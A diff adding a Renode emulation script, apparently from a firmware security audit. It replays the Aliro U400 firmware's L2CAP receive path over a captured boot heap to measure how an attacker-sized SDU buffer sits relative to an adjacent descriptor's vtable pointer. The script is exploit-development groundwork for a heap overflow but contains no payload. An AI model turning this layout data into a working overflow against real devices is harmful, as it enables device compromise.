@@ -1,0 +1,88 @@
+:name: Aliro U400 2-connection layout on the REAL boot heap (Step-driven, SRAM-overlay)
+:description: THE ground-truth harness. A fresh Step-driven machine (Step is reliable only on a fresh
+: machine in this dual-core/GlobalSerial config) is overlaid with the REAL post-boot SRAM image
+: (/tmp/aliro_sram.bin, captured after a radio+HAL-bypassed 4s boot: heap fragmented base 0x200248f8 ->
+: tail-base 0x20025EC8, allocator control block + all sl_bt/RTOS boot allocations restored). Then the
+: firmware's OWN L2CAP receive-path functions model the 2-connection attack against that live
+: fragmented heap:
+:   conn A: sub_805e9c8(1) => D_A(malloc 0x3c) ; *(D_A+0x12)=SDU_SIZE ; sub_805e7b0(D_A+4,0,0x10,src) => B1=malloc(SDU_SIZE) @ D_A+0x38
+:   conn B: sub_805e9c8(2) => D_B(malloc 0x3c)
+: Reports D_A, B1, D_B, [D_B+0x08] and the exact gap B1 -> (D_B+0x08). SDU_SIZE set below (default 0x40).
+#
+# malloc wrapper 0x8034b1c(size); descriptor creator sub_805e5fc; start_recv_data sub_805e9c8;
+# on_data_received sub_805e7b0. scratch/op-ctr in low RAM (0x2000E900) - OUTSIDE the heap so the
+# overlay+state machine don't collide with heap chunks. sentinel LR trap 0x2000EE00.
+
+using sysbus
+emulation SetGlobalSerialExecution true
+mach create "mg24"
+machine LoadPlatformDescription @platforms/boards/silabs/brd4186c.repl
+sysbus LoadELF @/home/chen/aliro-reassembly-audit/firmware/U400_primary_target.elf
+sysbus.cpu VectorTableOffset 0x08006000
+
+# --- overlay the REAL post-boot SRAM (restores heap + allocator control block) ---
+# aliro_boot_sram.bin = full SRAM captured after a radio+HAL-bypassed 4s boot (regenerate via
+# aliro_dump_bootsram.resc). Deterministic (no ASLR) => addresses equal the real device.
+python "import System; SB=self.Machine.SystemBus; data=System.IO.File.ReadAllBytes(\"/home/chen/matter-renode-work/sl-renode/scripts/silabs-vuln/aliro_boot_sram.bin\"); SB.WriteBytes(data, 0x20000000, False, None); System.Console.WriteLine(\"OVERLAY restored {0} bytes; tail-base now 0x{1:X}\".format(len(data), SB.ReadDoubleWord(0x20012894)))"
+
+# --- stubs: loggers + FreeRTOS transfer-list lock gate (same as layout_map) ---
+sysbus WriteWord 0x8033598 0x4770
+sysbus WriteWord 0x80336f0 0x4770
+sysbus WriteWord 0x80cae30 0x4770
+sysbus WriteDoubleWord 0x801e0f8 0x47702001
+sysbus WriteWord 0x801e124 0x4770
+sysbus WriteWord 0x801e114 0x4770
+# stub the SDK transfer-list registration sub_801df64 -> movs r0,#0; bx lr. It only does SDK-internal
+# list bookkeeping (asserts under the partial-boot scheduler state) AFTER the descriptor is already
+# malloc'd + stored in the app array; skipping it does NOT change heap placement of D_A/B1/D_B.
+sysbus WriteWord 0x801df64 0x2000
+sysbus WriteWord 0x801df66 0x4770
+sysbus WriteWord 0x2000EE00 0xE7FE
+sysbus WriteWord 0x2000EF00 0xE7FE
+sysbus WriteDoubleWord 0x2000E900 0x00000000
+# on_data memcpy source (0x41 * 16) - low RAM, outside heap
+sysbus WriteDoubleWord 0x2000EA00 0x41414141
+sysbus WriteDoubleWord 0x2000EA04 0x41414141
+sysbus WriteDoubleWord 0x2000EA08 0x41414141
+sysbus WriteDoubleWord 0x2000EA0C 0x41414141
+
+# --- SDU_SIZE for this run: monitor var $sdu (default 0x40), stored at RAM cell 0x2000E8F0 ---
+$sdu?=0x40
+sysbus WriteDoubleWord 0x2000E8F0 $sdu
+# op1 sets *(D_A+0x12) = SDU_SIZE (read from 0x2000E8F0)
+sysbus.cpu AddHook 0x2000EE00 "from Antmicro.Renode.Peripherals.CPU import RegisterValue as R; o=self.Bus.ReadDoubleWord(0x2000E900); sdu=self.Bus.ReadDoubleWord(0x2000E8F0); self.ErrorLog('SM_DISPATCH op={0} sdu=0x{2:X} array0=0x{1:X}'.format(o, self.Bus.ReadDoubleWord(0x2001b758), sdu)); DA=self.Bus.ReadDoubleWord(0x2001b758); z=(self.Bus.WriteWord(DA+0x12,sdu) if (o==1 and DA) else 0); cap=(o==3); B1=(self.Bus.ReadDoubleWord(DA+0x38) if DA else 0); DB=self.Bus.ReadDoubleWord(0x2001b75c); rec=[(0x2000EB00,DA),(0x2000EB04,B1),(0x2000EB08,DB),(0x2000EB0C,(self.Bus.ReadDoubleWord(DA+8) if DA else 0)),(0x2000EB10,(self.Bus.ReadDoubleWord(DB+8) if DB else 0)),(0x2000EB14,(DB+8 if DB else 0)),(0x2000EB18,(self.Bus.ReadDoubleWord(DA+0x38) if DA else 0))] if cap else []; [self.Bus.WriteDoubleWord(a,v) for a,v in rec]; seq=[(0x805e9c8,1,0,0,0),(0x805e7b0,DA+4,0,0x10,0x2000EA00),(0x805e9c8,2,0,0,0),(0,0,0,0,0)]; a,r0,r1,r2,r3 = seq[o] if o<len(seq) else (0,0,0,0,0); self.Bus.WriteDoubleWord(0x2000E900,o+1); self.SetRegister(0,R.Create(r0,32)); self.SetRegister(1,R.Create(r1,32)); self.SetRegister(2,R.Create(r2,32)); self.SetRegister(3,R.Create(r3,32)); self.SetRegister(13,R.Create(0x2003F000,32)); self.SetRegister(14,R.Create(0x2000EE01,32)); self.SetRegister(15,R.Create(a if a else 0x2000EF00,32))"
+
+# observation hooks (distinct addresses from the SM sentinel)
+sysbus.cpu AddHook 0x805e5fc "self.ErrorLog('CREATE_DESC sub_805e5fc conn={0}'.format(self.GetRegister(0).RawValue))"
+sysbus.cpu AddHook 0x805e7b0 "self.ErrorLog('ON_DATA_RECV sub_805e7b0 arg0=0x{0:X} off={1} len={2}'.format(self.GetRegister(0).RawValue, self.GetRegister(1).RawValue, self.GetRegister(2).RawValue))"
+sysbus.cpu AddHook 0x8034b1c "self.ErrorLog('MALLOC size={0}'.format(self.GetRegister(0).RawValue))"
+sysbus.cpu AddHook 0x805ea16 "self.ErrorLog('START_RECV_RET pop (conn done)')"
+
+sysbus.cpu SetRegister 13 0x2003F000
+sysbus.cpu SetRegister 14 0x2000EE01
+sysbus.cpu SetRegister 0 0
+sysbus.cpu PC 0x2000EE00
+sysbus.cpu Step 2000000
+
+echo "==================== REAL-HEAP 2-CONN RESULT ===================="
+python "import System; SB=self.Machine.SystemBus; System.Console.WriteLine('>>> SDU_SIZE = 0x{0:X}'.format(SB.ReadDoubleWord(0x2000E8F0)))"
+echo ">>> descriptor array 0x2001b758 [0][1][2]:"
+sysbus ReadDoubleWord 0x2001b758
+sysbus ReadDoubleWord 0x2001b75c
+sysbus ReadDoubleWord 0x2001b760
+echo ">>> D_A (0x2000EB00):"
+sysbus ReadDoubleWord 0x2000EB00
+echo ">>> B1 = [D_A+0x38] (0x2000EB04 / 0x2000EB18):"
+sysbus ReadDoubleWord 0x2000EB04
+sysbus ReadDoubleWord 0x2000EB18
+echo ">>> D_B (0x2000EB08):"
+sysbus ReadDoubleWord 0x2000EB08
+echo ">>> [D_A+0x08] vtable ptr (0x2000EB0C):"
+sysbus ReadDoubleWord 0x2000EB0C
+echo ">>> [D_B+0x08] vtable ptr (0x2000EB10):"
+sysbus ReadDoubleWord 0x2000EB10
+echo ">>> D_B+0x08 field ADDRESS (0x2000EB14):"
+sysbus ReadDoubleWord 0x2000EB14
+echo ">>> GAP B1 -> (D_B+0x08) + chunk contiguity (address-based):"
+python "import System; SB=self.Machine.SystemBus; sdu=SB.ReadDoubleWord(0x2000E8F0); da=SB.ReadDoubleWord(0x2000EB00); b1=SB.ReadDoubleWord(0x2000EB04); db=SB.ReadDoubleWord(0x2000EB08); dbf=SB.ReadDoubleWord(0x2000EB14); b1hdr=SB.ReadDoubleWord(b1-8); b1blk=b1-8; dbblk=db-8; stride=dbblk-b1blk; System.Console.WriteLine('B1=0x{0:X8} (chunk hdr@0x{1:X8}=0x{2:X8})'.format(b1,b1blk,b1hdr)); System.Console.WriteLine('D_B=0x{0:X8} (chunk hdr@0x{1:X8})  D_B+8=0x{2:X8}'.format(db,dbblk,dbf)); System.Console.WriteLine('B1_chunk->D_B_chunk stride = {0} bytes (=0x{0:X}); malloc(sdu={1}) chunk incl 8B hdr'.format(stride,sdu)); System.Console.WriteLine('GAP B1_payload -> D_B+8 = {0} bytes (=0x{0:X})  |  contiguous(no free hole)={1}  |  D_B_above_B1={2}'.format(dbf-b1, 'YES' if stride==(sdu+8 if (sdu%8==0) else ((sdu+7)&~7)+8) else 'CHECK', 'YES' if db>b1 else 'NO'))"
+quit
